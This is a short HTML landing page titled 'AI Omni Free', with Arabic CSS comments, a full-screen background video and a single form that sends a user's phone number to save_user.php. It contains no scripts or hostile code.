<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Omni Free</title>
    <style>
        /* إعدادات الشاشة الكاملة */
        body, html { 
            margin: 0; padding: 0; height: 100%; overflow: hidden; 
            font-family: sans-serif; 
        }
        
        /* تنسيق الفيديو كخلفية ثابتة */
        #bg-video {
            position: fixed;
            right: 0; bottom: 0;
            min-width: 100%; min-height: 100%;
            width: auto; height: auto;
            z-index: -1;
            object-fit: cover;
        }

        /* تنسيق صندوق الدخول */
        .container { 
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.7); 
            padding: 30px; 
            border-radius: 15px; 
            text-align: center; 
            width: 80%; 
            max-width: 400px; 
            color: white; 
        }
        input { 
            width: 90%; padding: 12px; margin: 15px 0; 
            border-radius: 5px; border: none; box-sizing: border-box;
        }
        button { 
            width: 95%; padding: 12px; background: #007bff; 
            color: white; border: none; border-radius: 5px; 
            cursor: pointer; font-size: 16px;
        }
        button:hover { background: #0056b3; }
    </style>
</head>
<body>

    <video autoplay muted loop playsinline id="bg-video">
        <source src="background.mp4" type="video/mp4">
    </video>

    <div class="container">
        <h2>AI Omni Free</h2>
        <form action="save_user.php" method="POST">
            <input type="tel" name="phone" placeholder="Enter Phone Number" required>
            <button type="submit">Continue</button>
        </form>
    </div>

</body>
</html>
